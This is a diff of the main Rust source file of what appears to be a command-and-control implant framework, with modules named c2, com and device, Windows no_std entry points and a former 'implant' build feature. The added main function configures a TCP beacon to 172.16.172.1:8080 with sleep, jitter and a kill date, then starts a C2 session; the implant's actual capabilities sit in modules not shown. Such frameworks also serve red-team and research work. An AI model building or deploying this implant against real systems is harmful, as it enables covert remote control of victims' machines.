@@ -14,24 +14,65 @@
 // along with this program.  If not, see <https://www.gnu.org/licenses/>.
 //
 
-#![no_implicit_prelude]
+// Initial Attributes
+// ==============================
 #![no_main]
-#![cfg_attr(not(feature = "std"), no_std)]
+#![no_implicit_prelude]
+// ==============================
+// Nightly Arguments
+// ==============================
+#![allow(internal_features)]
+// ==============================
+// Required Features
+// ==============================
+#![feature(
+    cfg_match,
+    extract_if,
+    trait_alias,
+    prelude_2024,
+    allocator_api,
+    fmt_internals,
+    error_in_core,
+    const_mut_refs,
+    core_intrinsics,
+    btree_extract_if,
+    alloc_layout_extra,
+    vec_into_raw_parts,
+    slice_index_methods,
+    const_intrinsic_copy,
+    pointer_is_aligned_to
+)]
+// ==============================
+// Setup for no_std on Windows
+// ==============================
 #![cfg_attr(
-    not(feature = "std"),
+    any(not(target_family = "windows"), feature = "std"),
+    feature(can_vector, io_error_more, seek_stream_len, io_error_uncategorized)
+)]
+// ==============================
+// Setup for std on Windows
+// ==============================
+#![cfg_attr(all(target_family = "windows", feature = "std"), feature(iter_collect_into))]
+// ==============================
+// Add additional features used
+// for stx.
+// ==============================
+#![cfg_attr(
+    all(target_family = "windows", not(feature = "std")),
+    no_std,
     feature(
         start,
         lang_items,
+        new_uninit,
         ptr_as_uninit,
         naked_functions,
-        core_intrinsics,
-        panic_info_message,
+        iter_collect_into,
         maybe_uninit_slice,
-        maybe_uninit_write_slice,
+        panic_info_message,
+        maybe_uninit_write_slice
     )
 )]
-#![cfg_attr(any(unix, feature = "std"), feature(io_error_more, can_vector, seek_stream_len))]
-#![feature(ip_in_core, error_in_core, new_uninit)]
+
 // We'll enable these later :P
 //#![windows_subsystem = "console"]
 //#![windows_subsystem = "windows"]
@@ -40,41 +81,71 @@ pub mod c2;
 pub mod com;
 pub mod data;
 pub mod device;
+pub mod env;
+#[path = "compat/ffi.rs"]
+pub mod ffi;
+pub mod fs;
+#[path = "compat/io.rs"]
+pub mod io;
 pub mod net;
+#[path = "compat/path.rs"]
+pub mod path;
+#[path = "compat/prelude.rs"]
+pub mod prelude;
 pub mod process;
 pub mod sync;
 pub mod thread;
+pub mod time;
 pub mod util;
 
-use crate::com::{Flag, Packet};
-use crate::data::Writer;
-use crate::util::stx::prelude::*;
+use core::time::Duration;
 
-#[cfg(all(windows, not(feature = "std")))]
-#[global_allocator]
-static GLOBAL: device::winapi::HeapAllocator = device::winapi::HeapAllocator::new();
+use crate::c2::cfg::OwnedConfig;
+use crate::c2::Session;
+use crate::data::memory::Manager;
+use crate::data::time::Time;
+use crate::prelude::*;
+use crate::util::log::{console, Level, Log};
 
 fn main_inner() -> i32 {
-    let mut p = Packet::default();
-    p.id = 233;
-    p.flags.set_group(0x123);
-    p.flags.set_position(133);
-    p.flags.set_len(999);
-    p.flags |= Flag::CRYPT;
-    p.write_str(&"derp").unwrap();
+    let mm = Manager::new();
+    {
+        println!("Hello!");
+        let v = OwnedConfig::new_in(mm.silo())
+            .host("172.16.172.1:8080")
+            .connect_tcp()
+            .sleep(Duration::from_secs(10))
+            .jitter(10)
+            .kill_date(Time::new(2024, data::time::Month::December, 10, 13, 0, 0))
+            .try_into()
+            .unwrap();
 
-    println!("packet {:?}", p);
+        println!("ready?");
 
-    c2::shoot("localhost:8080", p).unwrap();
+        Session::new_in(
+            Log::new(Level::Trace, None, console()),
+            v,
+            Some(&mm),
+            mm.silo(),
+        )
+        .unwrap()
+        .start(Some(Duration::from_secs(5)), None)
+        .unwrap();
+    }
+    println!("done?");
 
     0
 }
+
+#[cfg(all(windows, not(feature = "std")))]
+#[global_allocator]
+static GLOBAL: crate::device::winapi::HeapAllocator = crate::device::winapi::HeapAllocator::new();
 
 #[cfg(any(unix, feature = "std"))]
 #[inline]
 #[no_mangle]
 fn main() {
-    process::exit(main_inner())
+    crate::process::exit(main_inner())
 }
 
 #[cfg(all(windows, not(feature = "std")))]
@@ -82,17 +153,8 @@ fn main() {
 #[no_mangle]
 extern "C" fn _main() {
     let r = main_inner();
-    device::winapi::unload_libraries();
-    process::exit(r)
-}
-
-#[cfg(all(windows, not(feature = "std")))]
-#[inline]
-#[no_mangle]
-extern "C" fn WinMain(_h: usize, _z: usize, _a: usize, _s: u32) -> i32 {
-    let r = main_inner();
-    device::winapi::unload_libraries();
-    r
+    crate::device::winapi::unload_libraries();
+    crate::process::exit(r)
 }
 
 #[cfg(not(test))]
@@ -100,7 +162,7 @@ extern "C" fn WinMain(_h: usize, _z: usize, _a: usize, _s: u32) -> i32 {
 #[allow(unused_variables)]
 #[panic_handler]
 fn panic(p: &core::panic::PanicInfo<'_>) -> ! {
-    #[cfg(not(feature = "implant"))]
+    #[cfg(not(feature = "strip"))]
     {
         println!("=========== [PANIC] ===========");
         if let Some(p) = p.payload().downcast_ref::<&str>() {
@@ -114,6 +176,15 @@ fn panic(p: &core::panic::PanicInfo<'_>) -> ! {
         }
         println!("========= [END PANIC] =========");
     }
-    device::winapi::unload_libraries();
-    process::exit(255)
+    crate::device::winapi::unload_libraries();
+    crate::process::exit(255)
+}
+
+#[cfg(all(windows, not(feature = "std")))]
+#[inline]
+#[no_mangle]
+extern "C" fn WinMain(_h: usize, _z: usize, _a: usize, _s: u32) -> i32 {
+    let r = main_inner();
+    crate::device::winapi::unload_libraries();
+    r
 }
